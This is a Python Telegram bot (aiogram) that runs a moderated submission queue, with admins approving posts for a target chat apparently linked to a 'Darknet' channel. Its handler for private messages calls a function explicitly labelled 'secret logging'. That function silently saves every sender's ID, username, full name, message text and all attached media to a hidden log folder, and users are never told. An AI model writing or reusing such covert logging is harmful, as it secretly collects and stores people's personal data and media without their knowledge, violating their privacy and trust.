import os
import json
import uuid
import time
import asyncio
from typing import Dict, List, Tuple
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ContentType
from datetime import datetime

TOKEN = os.getenv("BOT_TOKEN")
Q_ADMIN = int(os.getenv("Q_ADMIN"))
TARGET_CHAT = int(os.getenv("TARGET_CHAT"))
TARGET_TOPIC = os.getenv("TARGET_TOPIC")
if TARGET_TOPIC:
    TARGET_TOPIC = int(TARGET_TOPIC)
else:
    TARGET_TOPIC = None

ADMINS = set()
_raw_admins = os.getenv("ADMINS", "")
if _raw_admins:
    try:
        ADMINS = set(map(int, filter(None, [s.strip() for s in _raw_admins.split(",")])))
    except Exception:
        ADMINS = set()

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# ============================
# ✔️ СЕКРЕТНОЕ ЛОГИРОВАНИЕ
# ============================

LOG_DIR = "secret_logs"
os.makedirs(LOG_DIR, exist_ok=True)

async def secret_log(msg: types.Message):
    """Сохранение всех сообщений и медиа в secret_logs/"""

    user = msg.from_user
    uid = user.id
    username = user.username or "none"
    fullname = user.full_name
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    base_name = f"{timestamp}_{uid}"
    
    # ---- META ----
    meta_path = os.path.join(LOG_DIR, base_name + "_meta.txt")
    with open(meta_path, "w", encoding="utf-8") as f:
        f.write(f"DATE: {timestamp}\n")
        f.write(f"USER_ID: {uid}\n")
        f.write(f"USERNAME: @{username}\n")
        f.write(f"FULLNAME: {fullname}\n")
        f.write(f"TEXT: {msg.text or msg.caption or '—'}\n")

    # ---- Определяем медиа ----
    media_id = None
    ext = None

    if msg.photo:
        media_id = msg.photo[-1].file_id
        ext = ".jpg"
    elif msg.video:
        media_id = msg.video.file_id
        ext = ".mp4"
    elif msg.document:
        media_id = msg.document.file_id
        ext = "_" + msg.document.file_name
    elif msg.voice:
        media_id = msg.voice.file_id
        ext = ".ogg"
    elif msg.audio:
        media_id = msg.audio.file_id
        ext = ".mp3"
    elif msg.animation:
        media_id = msg.animation.file_id
        ext = ".gif"
    elif msg.sticker:
        media_id = msg.sticker.file_id
        ext = ".webp"

    # ---- Скачиваем медиа ----
    if media_id:
        file = await bot.get_file(media_id)
        data = await bot.download_file(file.file_path)

        if not ext.startswith("_"):
            path = os.path.join(LOG_DIR, base_name + ext)
        else:
            path = os.path.join(LOG_DIR, base_name + ext)

        with open(path, "wb") as f:
            f.write(data.read())

# ============================
# СТАРЫЙ КОД
# ============================

pending: Dict[str, Dict] = {}
admin_msgs: Dict[str, List[Tuple[int, int]]] = {}
processed: Dict[str, str] = {}
last_msg_time: Dict[int, float] = {}

PENDING_FILE = "pending.json"
ADMIN_MSGS_FILE = "admin_msgs.json"
PROCESSED_FILE = "processed.json"

def safe_write(path: str, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f)
    except Exception:
        pass

def safe_read(path: str):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None

def persist_all():
    safe_write(PENDING_FILE, pending)
    safe_write(ADMIN_MSGS_FILE, admin_msgs)
    safe_write(PROCESSED_FILE, processed)

def load_all():
    global pending, admin_msgs, processed
    p = safe_read(PENDING_FILE)
    if isinstance(p, dict):
        pending = p
    a = safe_read(ADMIN_MSGS_FILE)
    if isinstance(a, dict):
        admin_msgs = {k: [(int(x[0]), int(x[1])) for x in v] for k, v in a.items()}
    pr = safe_read(PROCESSED_FILE)
    if isinstance(pr, dict):
        processed = pr

load_all()
LOCK = asyncio.Lock()
SPAM_TIMEOUT = 90

def build_keyboard(rid: str) -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton("Отправить ✅", callback_data=f"send:{rid}"),
        InlineKeyboardButton("Отклонить ❌", callback_data=f"deny:{rid}")
    )
    return kb

async def send_admin_panel(admin_id: int, orig: types.Message, rid: str):
    try:
        copied = await orig.copy_to(admin_id)
    except Exception:
        return None, None

    try:
        kb = build_keyboard(rid)
        buttons_msg = await bot.send_message(admin_id, "Что делаем с сообщением?", reply_markup=kb)
        return copied.message_id, buttons_msg.message_id
    except Exception:
        return None, None

async def clear_keyboards(rid: str):
    entries = admin_msgs.get(rid, [])
    for admin_id, buttons_msg_id in list(entries):
        try:
            await bot.edit_message_reply_markup(admin_id, buttons_msg_id, reply_markup=None)
        except:
            pass
    admin_msgs.pop(rid, None)
    persist_all()

# ----------------------------------------------------------------------
# ✔️ ХЕНДЛЕР + секретное логирование
# ----------------------------------------------------------------------
@dp.message_handler(lambda m: m.chat.type == "private", content_types=ContentType.ANY)
async def handle_private(msg: types.Message):

    # секретное логирование
    await secret_log(msg)

    user_id = msg.from_user.id
    now = time.time()

    if user_id in last_msg_time and now - last_msg_time[user_id] < SPAM_TIMEOUT:
        remaining = int(SPAM_TIMEOUT - (now - last_msg_time[user_id]))
        return await msg.reply(f"⏳ Писать можно раз в {SPAM_TIMEOUT} секунд. Попробуйте через {remaining} сек.")
    last_msg_time[user_id] = now

    await msg.reply("Сообщение в модерации, ожидайте✅")

    rid = uuid.uuid4().hex
    pending[rid] = {
        "chat_id": msg.chat.id,
        "msg_id": msg.message_id,
        "from_user_id": user_id,
        "from_username": msg.from_user.username or "",
        "ts": now
    }
    admin_msgs[rid] = []
    persist_all()

    # ❌ УДАЛЕНО: отправка логов Q_ADMIN

    targets = set(ADMINS)
    targets.add(Q_ADMIN)

    async with LOCK:
        for admin_id in list(targets):
            copied_id, buttons_id = await send_admin_panel(admin_id, msg, rid)
            if copied_id and buttons_id:
                admin_msgs[rid].append((admin_id, buttons_id))
        persist_all()


@dp.callback_query_handler(lambda c: c.data and (c.data.startswith("send:") or c.data.startswith("deny:")))
async def handle_moderation(cb: types.CallbackQuery):
    uid = cb.from_user.id
    if uid not in ADMINS and uid != Q_ADMIN:
        await cb.answer(cache_time=0)
        return

    try:
        action, rid = cb.data.split(":", 1)
    except:
        await cb.answer()
        return

    async with LOCK:
        if rid in processed:
            await cb.answer("Уже обработано")
            try: await cb.message.edit_reply_markup(reply_markup=None)
            except: pass
            return

        info = pending.get(rid)
        if not info:
            await cb.answer("Устарело")
            try: await cb.message.edit_reply_markup(reply_markup=None)
            except: pass
            return

        processed[rid] = f"{action}:{uid}:{int(time.time())}"
        persist_all()

        if action == "send":
            try:
                if TARGET_TOPIC:
                    await bot.copy_message(TARGET_CHAT, info["chat_id"], info["msg_id"], message_thread_id=TARGET_TOPIC)
                else:
                    await bot.copy_message(TARGET_CHAT, info["chat_id"], info["msg_id"])
            except:
                pass
        else:
            try:
                await bot.send_message(info["from_user_id"], "Сообщение посчитали непригодным для Darknet❌")
            except:
                pass

        await clear_keyboards(rid)

        # ❌ УДАЛЕНО: уведомления Q_ADMIN

        pending.pop(rid, None)
        admin_msgs.pop(rid, None)
        persist_all()

        await cb.answer("Готово")
        try: await cb.message.edit_reply_markup(reply_markup=None)
        except: pass


if __name__ == "__main__":
    try:
        executor.start_polling(dp, skip_updates=True)
    finally:
        persist_all()
    
